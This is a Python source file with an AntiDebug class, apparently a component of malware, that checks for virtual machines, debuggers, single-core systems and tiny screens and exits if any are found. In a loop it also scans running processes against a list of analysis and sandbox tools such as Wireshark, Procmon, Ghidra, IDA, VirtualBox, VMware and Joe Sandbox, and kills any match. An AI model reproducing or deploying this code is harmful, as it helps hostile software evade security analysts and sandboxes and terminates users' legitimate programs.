from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
import threading
import sys
import multiprocessing
import ctypes
import time


class AntiDebug:

    def detect_vm(self):
        if hasattr(sys, 'real_prefix'):
            sys.exit()

    def detect_core(self):
        if multiprocessing.cpu_count() == 1:
            sys.exit()

    def check_for_process(self):
        for proc in process_iter():
            try:
                for name in ['regmon', 'diskmon', 'procmon', 'traffic', 'wireshark', 'fiddler', 'packet', 'debuger', 'dbg', 'ida', 'dumper', 'pestudio', 'hacker', "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser", "VGAuthService.exe", "vmacthlp.exe", "vmsrvc.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe", "joeboxcontrol.exe", "joeboxserver.exe", "joeboxserver.exe", "charles", "fiddler", "postman", "xdbg32", "ghidra", "ollydbg", "ida", "httpdebuggerui", "dnspy"]:
                    if name.lower() in proc.name().lower():
                        try:
                            proc.kill()
                            sys.exit()
                        except:
                            sys.exit()
            except (NoSuchProcess, AccessDenied, ZombieProcess):
                sys.exit()

    def check_for_debugger(self):
        if ctypes.windll.kernel32.IsDebuggerPresent() != 0 or ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(), False) != 0:
            sys.exit()

    def detect_screen_syze(self):
        x = ctypes.windll.user32.GetSystemMetrics(0)
        y = ctypes.windll.user32.GetSystemMetrics(1)

        if x <= 200 or y <= 200:
            sys.exit()

    def ok(self):
        print("caca")
        self.detect_screen_syze()
        self.detect_core()
        self.detect_vm()
        while True:
            self.check_for_process()
            self.check_for_debugger()
            time.sleep(3)
